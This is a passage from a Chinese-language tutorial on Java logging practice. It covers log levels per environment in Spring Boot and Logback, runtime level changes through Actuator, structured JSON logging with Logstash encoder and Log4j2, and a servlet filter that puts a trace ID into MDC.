<li><strong><code>TRACE</code></strong>: <strong>追踪，比 <code>DEBUG</code> 更细粒度的日志，用于追踪代码的执行细节。</strong><ul>
<li><strong>何时使用</strong>：用于非常深入的、细致的调试，例如追踪一个复杂算法的每一步，或者一个方法的进入和退出。<strong>它比 <code>DEBUG</code> 更详细，性能开销也更大，通常只在解决特定棘手问题时临时开启。</strong></li>
<li><strong>示例</strong>：“Entering method <code>calculatePrice</code>“, “Looping through items, index&#x3D;3”, “Exiting method <code>calculatePrice</code>“。</li>
<li><strong>目标读者</strong>：开发人员。</li>
</ul>
</li>
</ul>
<hr>
<h4 id="4-3-2-为不同环境设置不同日志级别"><a href="#4-3-2-为不同环境设置不同日志级别" class="headerlink" title="4.3.2 为不同环境设置不同日志级别"></a>4.3.2 为不同环境设置不同日志级别</h4><p>这是日志级别管理的核心实践。我们希望在不同环境中有不同的日志输出策略：</p>
<ul>
<li><strong>开发环境 (dev)</strong>: 需要最详细的日志，便于开发和调试。</li>
<li><strong>测试环境 (test&#x2F;qa)</strong>: 模拟生产环境，但可能需要对特定模块开启更详细的日志以配合测试。</li>
<li><strong>生产环境 (prod)</strong>: 日志量应严格控制，只记录必要信息，以保证性能和节约存储成本。</li>
</ul>
<p><strong>实现方式：</strong></p>
<p><strong>1. 在 Spring Boot 的 <code>application.yml</code> 中配置 (最简单)</strong></p>
<p>Spring Boot 允许在 <code>application.yml</code> (或 <code>.properties</code>) 文件中快速设置日志级别。你可以为不同的 Spring Profile 创建不同的配置文件（如 <code>application-dev.yml</code>, <code>application-prod.yml</code>）。</p>
<ul>
<li><p><strong><code>application-dev.yml</code></strong>:</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">level:</span></span><br><span class="line">    <span class="comment"># 根日志级别设置为 DEBUG</span></span><br><span class="line">    <span class="attr">root:</span> <span class="string">DEBUG</span></span><br><span class="line">    <span class="comment"># 对 Spring 框架本身的日志保持 INFO，避免过多噪音</span></span><br><span class="line">    <span class="attr">org.springframework.web:</span> <span class="string">INFO</span></span><br><span class="line">    <span class="comment"># 对我们自己项目的 dao 层开启 TRACE，方便看 SQL</span></span><br><span class="line">    <span class="attr">com.mycompany.dao:</span> <span class="string">TRACE</span></span><br></pre></td></tr></table></figure>
</li>
<li><p><strong><code>application-prod.yml</code></strong>:</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">logging:</span></span><br><span class="line">  <span class="attr">level:</span></span><br><span class="line">    <span class="comment"># 生产环境，根日志级别必须是 INFO</span></span><br><span class="line">    <span class="attr">root:</span> <span class="string">INFO</span></span><br><span class="line">    <span class="comment"># 可以为某个需要重点监控的模块单独设置级别</span></span><br><span class="line">    <span class="attr">com.mycompany.payment.service:</span> <span class="string">DEBUG</span> </span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>2. 在 <code>logback-spring.xml</code> 中使用 <code>&lt;springProfile&gt;</code> 标签 (更灵活)</strong></p>
<p>当需要更复杂的配置（如根据环境切换 Appender）时，使用 <code>logback-spring.xml</code> 是最佳选择。<code>&lt;springProfile&gt;</code> 标签允许我们根据激活的 Spring Profile 来应用不同的配置块。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 引入 Spring Boot 的默认配置 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">resource</span>=<span class="string">&quot;org/springframework/boot/logging/logback/base.xml&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 开发环境配置 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">springProfile</span> <span class="attr">name</span>=<span class="string">&quot;dev&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;com.mycompany&quot;</span> <span class="attr">level</span>=<span class="string">&quot;DEBUG&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;org.hibernate.SQL&quot;</span> <span class="attr">level</span>=<span class="string">&quot;DEBUG&quot;</span>/&gt;</span> <span class="comment">&lt;!-- 开发时打印 SQL --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">springProfile</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 生产和测试环境配置 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">springProfile</span> <span class="attr">name</span>=<span class="string">&quot;prod, test&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 生产环境，确保 com.mycompany 包下的日志级别为 INFO --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">logger</span> <span class="attr">name</span>=<span class="string">&quot;com.mycompany&quot;</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">springProfile</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 无论什么环境，根级别都设置为 INFO --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;CONSOLE&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 可以在 prod profile 中添加 FILE appender --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>3. 运行时动态调整</strong></p>
<p>现代应用（特别是基于 Spring Boot Actuator 的应用）还支持在<strong>不重启应用</strong>的情况下，通过 HTTP 端点（如 <code>/actuator/loggers</code>）动态修改正在运行的应用的日志级别。这对于在线上紧急排查问题非常有用。</p>
<p><strong>POST请求到 <code>/actuator/loggers/com.mycompany.service.UserService</code></strong></p>
<p>Body: <code>{&quot;configuredLevel&quot;: &quot;DEBUG&quot;}</code></p>
<p>这会立即将 <code>UserService</code> 的日志级别调整为 <code>DEBUG</code>，问题排查完毕后，再将其改回 <code>INFO</code> 或 <code>null</code> (继承上级)。</p>
<hr>
<h3 id="4-4-结构化日志"><a href="#4-4-结构化日志" class="headerlink" title="4.4 结构化日志"></a>4.4 结构化日志</h3><p>结构化日志是一种将日志信息以<strong>机器友好的、一致的格式</strong>（通常是 <strong>JSON</strong>）进行记录的实践。它将传统日志中非结构化的、纯文本的消息，转变为由<strong>键值对 (Key-Value pairs)</strong> 组成的清晰数据结构。</p>
<h4 id="4-4-1-为什么需要结构化日志？"><a href="#4-4-1-为什么需要结构化日志？" class="headerlink" title="4.4.1 为什么需要结构化日志？"></a>4.4.1 为什么需要结构化日志？</h4><p>传统的纯文本日志（Plain-text Logging）虽然对人类友好，但对机器来说却是一个噩梦。</p>
<p><strong>传统日志的痛点：</strong></p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INFO  [main] c.m.s.OrderService - User 1001 placed an order 8088 successfully. Total price: 99.99 USD.</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>难以解析</strong>：如果想查询所有 <code>userId</code> 为 <code>1001</code> 的订单日志，你只能使用<strong>模糊的文本搜索</strong>（如 <code>grep &quot;User 1001&quot;</code>）。如果想统计所有订单的总价，几乎不可能，因为价格信息 <code>99.99</code> 嵌在文本中，需要复杂的正则表达式来提取，既慢又容易出错。</li>
<li><strong>无法精确过滤和聚合</strong>：你无法执行类似 SQL 的查询，例如 <code>SELECT * FROM logs WHERE level=&#39;INFO&#39; AND userId=&#39;1001&#39; AND price &gt; 50</code>。</li>
<li><strong>上下文信息丢失</strong>：虽然可以通过MDC添加 <code>traceId</code>，但这些信息仍然是字符串的一部分，而不是独立的、可索引的字段。</li>
</ul>
<p><strong>结构化日志的优势：</strong></p>
<p>结构化日志将上述日志转换为 JSON 格式：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@timestamp&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2023-10-27T10:30:00.123+08:00&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;INFO&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;thread_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;main&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;logger_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.mycompany.service.OrderService&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="string">&quot;User placed an order successfully.&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;app_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;order-service&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;userId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1001&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;orderId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;8088&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;price&quot;</span><span class="punctuation">:</span> <span class="number">99.99</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;currency&quot;</span><span class="punctuation">:</span> <span class="string">&quot;USD&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>便于机器解析和索引</strong>：<br>集中式日志系统（如 ELK&#x2F;EFK Stack, Splunk, Graylog, Loki）可以<strong>原生解析 JSON</strong>。它们会自动将 JSON 中的每个键（如 <code>userId</code>, <code>price</code>）识别为一个独立的<strong>字段 (Field)</strong>。</li>
<li><strong>强大的查询和分析能力</strong>：<br>一旦日志被索引，你就可以像操作数据库一样对日志进行<strong>精确、高效</strong>的查询：<ul>
<li><strong>过滤</strong>：<code>userId:&quot;1001&quot;</code> AND <code>price &gt; 50</code></li>
<li><strong>聚合</strong>：计算所有订单的平均 <code>price</code> (<code>avg(price)</code>)。</li>
<li><strong>统计</strong>：统计每个 <code>userId</code> 的下单次数 (<code>count group by userId</code>)。</li>
<li><strong>可视化</strong>：基于这些字段创建仪表盘（Dashboard），例如实时监控订单总额、错误率等。</li>
</ul>
</li>
<li><strong>上下文清晰</strong>：业务数据（如 <code>userId</code>, <code>orderId</code>）与元数据（如 <code>timestamp</code>, <code>level</code>）分离，结构清晰，一目了然。</li>
</ul>
<p>总之，结构化日志将日志从单纯的“<strong>阅读材料</strong>”转变为可分析、可查询的“<strong>数据源</strong>”，是实现高级监控、告警、分布式链路追踪和业务洞察的基石。</p>
<h4 id="4-4-2-如何实现结构化日志"><a href="#4-4-2-如何实现结构化日志" class="headerlink" title="4.4.2 如何实现结构化日志"></a><strong>4.4.2 如何实现结构化日志</strong></h4><p>实现结构化日志的核心是选择一个合适的 <strong>Encoder</strong> 或 <strong>Layout</strong>，让它将日志事件格式化为 JSON。</p>
<p><strong>1. 使用 <code>logstash-logback-encoder</code> (对于 Logback)</strong></p>
<p>这是在 Logback 生态中最流行、功能最强大的解决方案。它是一个专门为与 Logstash（ELK Stack 的一部分）集成而设计的库，但其输出的 JSON 格式是通用的，适用于任何支持 JSON 的日志系统。</p>
<p><strong>实现步骤：</strong></p>
<p>a. <strong>添加 Maven 依赖</strong>：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>net.logstash.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logstash-logback-encoder<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>7.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span> <span class="comment">&lt;!-- 使用最新稳定版 --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>b. <strong>在 <code>logback.xml</code> 中配置 <code>LogstashEncoder</code></strong>：</p>
<p>将 <code>PatternLayoutEncoder</code> 替换为 <code>LogstashEncoder</code>。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">appender</span> <span class="attr">name</span>=<span class="string">&quot;STDOUT_JSON&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">encoder</span> <span class="attr">class</span>=<span class="string">&quot;net.logstash.logback.encoder.LogstashEncoder&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 可以在这里添加自定义的静态字段 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">customFields</span>&gt;</span>&#123;&quot;app_name&quot;:&quot;order-service&quot;&#125;<span class="tag">&lt;/<span class="name">customFields</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">encoder</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">appender</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span> <span class="attr">level</span>=<span class="string">&quot;INFO&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">appender-ref</span> <span class="attr">ref</span>=<span class="string">&quot;STDOUT_JSON&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>c. <strong>在代码中通过 MDC 或专用 Marker 添加动态字段</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.slf4j.MDC;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> net.logstash.logback.argument.StructuredArguments.kv;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 方式一：使用 MDC (通用且推荐)</span></span><br><span class="line">MDC.put(<span class="string">&quot;userId&quot;</span>, <span class="string">&quot;1001&quot;</span>);</span><br><span class="line">MDC.put(<span class="string">&quot;orderId&quot;</span>, <span class="string">&quot;8088&quot;</span>);</span><br><span class="line">logger.info(<span class="string">&quot;User placed an order successfully.&quot;</span>);</span><br><span class="line">MDC.clear(); <span class="comment">// 请求结束时务必清理</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 方式二：使用 logstash-logback-encoder 提供的 StructuredArguments (更灵活)</span></span><br><span class="line">logger.info(<span class="string">&quot;User placed an order successfully.&quot;</span>, </span><br><span class="line">            kv(<span class="string">&quot;price&quot;</span>, <span class="number">99.99</span>), </span><br><span class="line">            kv(<span class="string">&quot;currency&quot;</span>, <span class="string">&quot;USD&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>这两种方式都会将 <code>userId</code>, <code>orderId</code>, <code>price</code> 等字段添加到最终的 JSON 输出中。</p>
<p><strong>2. 使用 Log4j 2 的 <code>JSONLayout</code> (原生支持)</strong></p>
<p>Log4j 2 原生就内置了强大的 <code>JSONLayout</code>，无需引入额外的第三方库。</p>
<p><strong>实现步骤：</strong></p>
<p>a. <strong>在 <code>log4j2.xml</code> 中配置 <code>JSONLayout</code></strong>：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;WARN&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;ConsoleJSON&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 使用 JSONLayout --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">JSONLayout</span> <span class="attr">complete</span>=<span class="string">&quot;false&quot;</span> <span class="attr">compact</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 定义自定义字段，可以引用 ContextMap (MDC) --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">KeyValuePair</span> <span class="attr">key</span>=<span class="string">&quot;app_name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;order-service&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">JSONLayout</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;ConsoleJSON&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>complete=&quot;false&quot;</code> 表示只输出 JSON 对象本身，而不是一个完整的 JSON 文档。</li>
<li><code>compact=&quot;true&quot;</code> 表示输出的 JSON 没有换行和缩进，节省空间。</li>
</ul>
<p>b. <strong>在代码中使用 <code>ThreadContext</code> (Log4j 2 的 MDC 实现)</strong>：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.ThreadContext;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">ThreadContext.put(<span class="string">&quot;userId&quot;</span>, <span class="string">&quot;1001&quot;</span>);</span><br><span class="line">ThreadContext.put(<span class="string">&quot;orderId&quot;</span>, <span class="string">&quot;8088&quot;</span>);</span><br><span class="line">logger.info(<span class="string">&quot;User placed an order successfully.&quot;</span>);</span><br><span class="line">ThreadContext.clearMap(); <span class="comment">// 请求结束时清理</span></span><br></pre></td></tr></table></figure>

<p><code>JSONLayout</code> 会自动将 <code>ThreadContext</code> 中的所有键值对包含在 JSON 输出中。</p>
<p>通过这些配置，你的应用就会开始输出结构化的 JSON 日志，为后续的日志集中、分析和监控铺平了道路。</p>
<hr>
<h3 id="4-5-MDC-Mapped-Diagnostic-Context-诊断上下文映射"><a href="#4-5-MDC-Mapped-Diagnostic-Context-诊断上下文映射" class="headerlink" title="4.5 MDC (Mapped Diagnostic Context) - 诊断上下文映射"></a>4.5 MDC (Mapped Diagnostic Context) - 诊断上下文映射</h3><p>MDC 是由日志框架提供的一种工具，它允许我们在日志输出中轻松地添加<strong>与当前线程绑定的</strong>上下文信息。你可以把它想象成一个<strong>对当前线程可见的、临时的 <code>Map&lt;String, String&gt;</code></strong>。一旦你在这个 Map 中存入一个键值对，后续在该线程中产生的所有日志，都可以配置为自动打印出这个键值对。</p>
<h4 id="4-5-1-用途：解决并发环境下的日志交叉问题"><a href="#4-5-1-用途：解决并发环境下的日志交叉问题" class="headerlink" title="4.5.1 用途：解决并发环境下的日志交叉问题"></a><strong>4.5.1 用途：解决并发环境下的日志交叉问题</strong></h4><p>在现代多线程的后端服务中（如 Web 服务器），多个用户的请求是<strong>并行处理</strong>的。每个请求都由一个独立的线程来处理。如果没有 MDC，所有线程的日志都会混杂地输出到同一个日志文件中，形成一团乱麻。</p>
<p><strong>没有 MDC 的场景：</strong></p>
<p>假设用户 A 和用户 B 同时访问系统：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// Log File</span><br><span class="line">INFO  [thread-1] Processing order for user A...</span><br><span class="line">INFO  [thread-2] Fetching profile for user B...</span><br><span class="line">ERROR [thread-1] Inventory check failed for product P1.</span><br><span class="line">INFO  [thread-2] Profile for user B loaded successfully.</span><br></pre></td></tr></table></figure>

<p>当你排查用户 A 的问题时，你很难从混乱的日志中快速筛选出只属于他那次请求的完整日志链路。</p>
<p><strong>使用 MDC 之后：</strong></p>
<p>通过 MDC，我们为每个请求生成一个唯一的 <strong><code>traceId</code></strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// Log File</span><br><span class="line">INFO  [thread-1] [traceId=abc-123] Processing order for user A...</span><br><span class="line">INFO  [thread-2] [traceId=xyz-789] Fetching profile for user B...</span><br><span class="line">ERROR [thread-1] [traceId=abc-123] Inventory check failed for product P1.</span><br><span class="line">INFO  [thread-2] [traceId=xyz-789] Profile for user B loaded successfully.</span><br></pre></td></tr></table></figure>

<p>现在，情况完全不同了。你只需搜索 <code>traceId=abc-123</code>，就能立即过滤出属于用户 A 请求的<strong>所有</strong>日志，无论它们是由哪个类、哪个方法打印的，也无论它们在日志文件中是如何交错的。</p>
<p><strong>核心用途总结：</strong></p>
<ul>
<li><strong>分布式链路追踪</strong>：<code>traceId</code> 是实现跨服务日志追踪的基石。当一个请求从服务A流转到服务B时，只要将 <code>traceId</code> 传递下去，就可以将两个服务中的相关日志串联起来。</li>
<li><strong>用户行为追踪</strong>：可以存入 <code>userId</code>, <code>sessionId</code> 等，方便排查特定用户的操作问题。</li>
<li><strong>多租户隔离</strong>：在 SaaS 应用中，可以存入 <code>tenantId</code>，方便按租户筛选日志。</li>
</ul>
<hr>
<h4 id="4-5-2-实现：Filter-Interceptor-模式"><a href="#4-5-2-实现：Filter-Interceptor-模式" class="headerlink" title="4.5.2 实现：Filter&#x2F;Interceptor 模式"></a>4.5.2 实现：Filter&#x2F;Interceptor 模式</h4><p>MDC 的生命周期必须严格地与请求（或任何一个工作单元）的生命周期绑定。最优雅、最通用的实现方式是使用 <strong>Servlet Filter</strong> (在 Web 应用中) 或 <strong>AOP Interceptor</strong>。</p>
<p><strong>原则：请求开始时设置，请求结束时必须清除。</strong></p>
<p><strong>清除操作至关重要</strong>，因为 Web 服务器的线程是会被<strong>重用</strong>的。如果不清除，上一个请求的 <code>traceId</code> 就会“污染”下一个使用该线程的请求，导致上下文信息错乱。<code>try-finally</code> 结构是保证清理操作必定执行的最佳实践。</p>
<p><strong>示例：使用 <code>ServletFilter</code> 实现 <code>traceId</code> 的注入</strong></p>
<ol>
<li><p><strong>创建 <code>TraceIdFilter</code></strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.slf4j.MDC;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.UUID;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TraceIdFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TRACE_ID_HEADER</span> <span class="operator">=</span> <span class="string">&quot;X-Trace-ID&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TRACE_ID_KEY</span> <span class="operator">=</span> <span class="string">&quot;traceId&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> </span><br><span class="line">            <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">httpRequest</span> <span class="operator">=</span> (HttpServletRequest) request;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 尝试从请求头获取 traceId，用于跨服务追踪</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">traceId</span> <span class="operator">=</span> httpRequest.getHeader(TRACE_ID_HEADER);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果没有，就生成一个新的</span></span><br><span class="line">        <span class="keyword">if</span> (traceId == <span class="literal">null</span> || traceId.isEmpty()) &#123;</span><br><span class="line">            traceId = UUID.randomUUID().toString().replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 关键步骤：将 traceId 放入 MDC</span></span><br><span class="line">        MDC.put(TRACE_ID_KEY, traceId);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 将请求传递给下一个过滤器或 Servlet</span></span><br><span class="line">            chain.doFilter(request, response);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 关键步骤：在请求处理完毕后，无论成功还是失败，都必须从 MDC 中移除 traceId</span></span><br><span class="line">            MDC.remove(TRACE_ID_KEY); </span><br><span class="line">            <span class="comment">// 或者 MDC.clear(); 清除所有</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 